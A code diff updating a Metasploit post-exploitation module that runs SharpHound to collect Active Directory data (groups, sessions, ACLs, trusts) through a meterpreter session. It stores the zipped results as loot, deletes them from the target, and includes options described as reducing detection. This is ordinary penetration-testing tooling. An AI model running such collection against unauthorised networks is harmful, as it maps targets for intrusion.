@@ -24,13 +24,18 @@ class MetasploitModule < Msf::Post
         'SessionTypes' => [ 'meterpreter' ],
         'Notes' => {
           'AKA' => ['sharphound'],
-          'SideEffects' => [ARTIFACTS_ON_DISK]
+          'SideEffects' => [ARTIFACTS_ON_DISK],
+          'Stability' => [],
+          'Reliability' => []
         }
       )
     )
 
     register_options([
-      OptString.new('CollectionMethod', [true, 'The collection method to use. This parameter accepts a comma separated list of values. Accepted values are Default, Group, LocalAdmin, RDP, DCOM, GPOLocalGroup, Session, ObjectProps, ComputerOnly, LoggedOn, Trusts, ACL, Container, DcOnly, All', 'Default']),
+      OptEnum.new('CollectionMethod', [
+        true, 'The collection method to use.', 'Default',
+        ['Group', 'LocalGroup', 'LocalAdmin', 'RDP', 'DCOM', 'PSRemote', 'Session', 'Trusts', 'ACL', 'Container', 'ComputerOnly', 'GPOLocalGroup', 'LoggedOn', 'ObjectProps', 'SPNTargets', 'Default', 'DCOnly', 'All']
+      ]),
       OptString.new('Domain', [false, 'Specifies the domain to enumerate. If not specified, will enumerate the current domain your user context specifies']),
       OptBool.new('Stealth', [true, 'Use stealth collection options, will sacrifice data quality in favor of much reduced network impact', false]),
       OptBool.new('ExcludeDomainControllers', [true, 'Exclude domain controllers from session queries. Useful for ATA environments which detect this behavior', false]),
@@ -40,7 +45,7 @@ class MetasploitModule < Msf::Post
       # these were never implemented
       # OptString.new('LDAPUsername', [false, 'User to connect to LDAP with', 'Default']),
       # OptString.new('LDAPPassword', [false, 'Password for user you are connecting to LDAP with']),
-      OptString.new('DisableKerbSigning', [false, 'Disables Kerberos Signing on requests', false]),
+      # OptString.new('DisableKerbSigning', [false, 'Disables Kerberos Signing on requests', false]),
       OptPath.new('OutputDirectory', [false, 'Folder to write json output to.  Default is Windows temp']),
       OptEnum.new('Method', [true, 'Method to run Sharphound with', 'download', ['download', 'disk']]),
       OptBool.new('EncryptZip', [false, 'If the zip should be password protected', true]),
@@ -51,21 +56,27 @@ class MetasploitModule < Msf::Post
 
   # Options removed or changed in sharphound v2 to sharphound v3
   # Removed:
-  # SearchForest
-  # OU
-  # IgnoreLdapCert
-  # Threads
-  # PingTimeout
-  # SkipPing
-  # LoopDelay
-  # MaxLoopTime
-  # SkipGCDeconfliction
-
+  #   SearchForest
+  #   OU
+  #   IgnoreLdapCert
+  #   Threads
+  #   PingTimeout
+  #   SkipPing
+  #   LoopDelay
+  #   MaxLoopTime
+  #   SkipGCDeconfliction
   # Renamed:
-  # ExcludeDc -> ExcludeDomainControllers
-  # LDAPUser -> LDAPUsername
-  # LDAPPass -> LDAPPassword
-  # JSONFolder -> OutputDirectory
+  #   ExcludeDc -> ExcludeDomainControllers
+  #   LDAPUser -> LDAPUsername
+  #   LDAPPass -> LDAPPassword
+  #   JSONFolder -> OutputDirectory
+
+  # Options removed or changed in sharphound Renamed in v4 (1.0.4) from v3:
+  # Renamed
+  #   (many of the single dash verbose command names are now double dash as is usual in Linux land)
+  #   encryptzip -> zippassword
+  #   nosavecache -> memcache
+  #   ExcludeDomainControllers -> excludedcs
 
   def sharphound_ps1
     File.join(Msf::Config.data_directory, 'post', 'powershell', 'SharpHound.ps1')
@@ -98,39 +109,33 @@ class MetasploitModule < Msf::Post
       fail_with(Failure::Unknown, 'PowerShell is not installed')
     end
 
-    extra_params = ''
-    if datastore['Domain']
-      extra_params += "-Domain #{datastore['Domain']} "
+    extra_params = []
+    [
+      [datastore['Domain'], "-d #{datastore['Domain']}"],
+      [datastore['Stealth'], '--Stealth'],
+      # [datastore['SkipGCDeconfliction'], "-SkipGCDeconfliction"],
+      [datastore['ExcludeDomainControllers'], '--ExcludeDCs'],
+      [datastore['DomainController'], "--DomainController #{datastore['DomainController']}"],
+      [datastore['LdapPort'], "--LdapPort #{datastore['LdapPort']}"],
+      [datastore['SecureLdap'], '--SecureLdap'],
+      [datastore['NoSaveCache'], '--MemCache'],
+    ].each do |params|
+      if params[0]
+        extra_params << params[1]
+      end
     end
 
-    if datastore['Stealth']
-      extra_params += '-Stealth '
-    end
-    if datastore['SkipGCDeconfliction']
-      extra_params += '-SkipGCDeconfliction '
-    end
-    if datastore['ExcludeDomainControllers']
-      extra_params += '-ExcludeDomainControllers '
-    end
-    if datastore['DomainController']
-      extra_params += "-DomainController #{datastore['DomainController']} "
-    end
-    if datastore['LdapPort']
-      extra_params += "-LdapPort #{datastore['LdapPort']} "
-    end
-    if datastore['SecureLdap']
-      extra_params += '-SecureLdap '
-    end
+    extra_params = "#{extra_params.join(' ')} "
+
     if datastore['EncryptZip']
-      extra_params += '-EncryptZip '
-    end
-    if datastore['NoSaveCache']
-      extra_params += '-NoSaveCache '
+      # for consistency, we use lower case password here since exe requires all extra_params to be lowercase
+      zip_pass = Rex::Text.rand_text_alpha_lower(12..20)
+      extra_params += "--ZipPassword #{zip_pass} "
     end
 
     # these options are only added if they aren't the sharphound default
     unless datastore['CollectionMethod'] == 'Default'
-      extra_params += "-CollectionMethod #{datastore['CollectionMethod']}"
+      extra_params += "-c #{datastore['CollectionMethod']}"
     end
     tmp_path = datastore['OutputDirectory'] || get_env('TEMP')
 
@@ -138,15 +143,15 @@ class MetasploitModule < Msf::Post
 
     if datastore['Method'] == 'download'
       command = download_run
+      extra_params = extra_params.gsub('--', '-')
       invoker = "Invoke-BloodHound -OutputDirectory \"#{tmp_path}\" -ZipFileName #{zip_name} #{extra_params}"
     elsif datastore['Method'] == 'disk'
       command = disk_run
       exe = command.sub('. ', '') # so we get the filename again
       # for exe, we move invoker into command to run more friendly
       invoker = ''
-      command = "#{command} -OutputDirectory \"#{tmp_path}\" -ZipFileName #{zip_name} #{extra_params}"
-      command.gsub!('-', '--')
-      command.gsub!(/(--[a-zA-Z]+ )/, &:downcase) # exe only uses downcase
+      extra_params = extra_params.downcase
+      command = "#{command} --outputdirectory \"#{tmp_path}\" --zipfilename #{zip_name} #{extra_params}"
     end
 
     print_status("Loading BloodHound with: #{command}")
@@ -155,23 +160,29 @@ class MetasploitModule < Msf::Post
 
     while (line = process.channel.read)
       line.split("\n").map { |s| print_status(s) }
-      m = line.match(/Compressing data to (.*\.zip)/)
+      m = line.match(/Enumeration Completed/)
       sleep 30 # a final wait just in case we caught the text prior to the zip happening
       next unless m
 
-      zip_path = m[1]
+      # we now need to find our zip, its a datetime_zipfilename.zip naming convention
+      zip_path = nil
+      files = ls(tmp_path)
+      files.each do |file|
+        next unless file.end_with?("#{zip_name}.zip")
+
+        zip_path = "#{tmp_path}\\#{file}"
+        break
+      end
+      if zip_path.nil?
+        print_bad("Unable to find results file in #{tmp_path}.")
+      end
+
       p = store_loot('windows.ad.bloodhound', 'application/zip', session, read_file(zip_path), File.basename(zip_path))
+      rm_f zip_path
       print_good("Downloaded #{zip_path}: #{p}")
       rm_f(zip_path)
-      # the line *after* 'Compressing data to...' is the zip password.
+      # store the password since we know it was successful
       if datastore['EncryptZip']
-        zip_pass = nil
-        # older versions or powershell may have 2 spaces, exe v3 has 1
-        unless /Password for Zip file is (?<zip_pass>.*)\./ =~ line
-          # try one last time incase we hit right after the zip statement, but before the password statement
-          /Password for Zip file is (?<zip_pass>.*)\./ =~ process.channel.read
-
-        end
         print_good "Zip password: #{zip_pass}"
         report_note(host: session,
                     data: "Bloodhound/Sharphound loot #{p} password is #{zip_pass}",
